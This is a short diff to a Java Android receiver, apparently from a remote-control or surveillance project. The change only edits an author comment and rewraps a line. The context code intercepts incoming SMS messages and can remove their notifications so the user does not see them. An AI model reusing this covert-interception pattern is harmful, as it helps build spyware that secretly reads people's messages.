@@ -4,7 +4,7 @@
  * Project      : RCS, AndroidService
  * File         : BroadcastMonitorSms.java
  * Created      : 6-mag-2011
- * Author		: zeno
+ * Author		: zeno <- menzongne!
  * *******************************************/
 
 package com.android.service.listener;
@@ -40,8 +40,8 @@ public class BroadcastMonitorSms extends BroadcastReceiver {
 			msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
 
 			final int result = ListenerSms.self().dispatch(
-					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), System
-							.currentTimeMillis(), false));
+					new Sms(msgs[i].getOriginatingAddress(), msgs[i].getMessageBody().toString(), 
+							System.currentTimeMillis(), false));
 
 			// 1 means "remove notification for this sms"
 			if ((result & 1) == 1) {
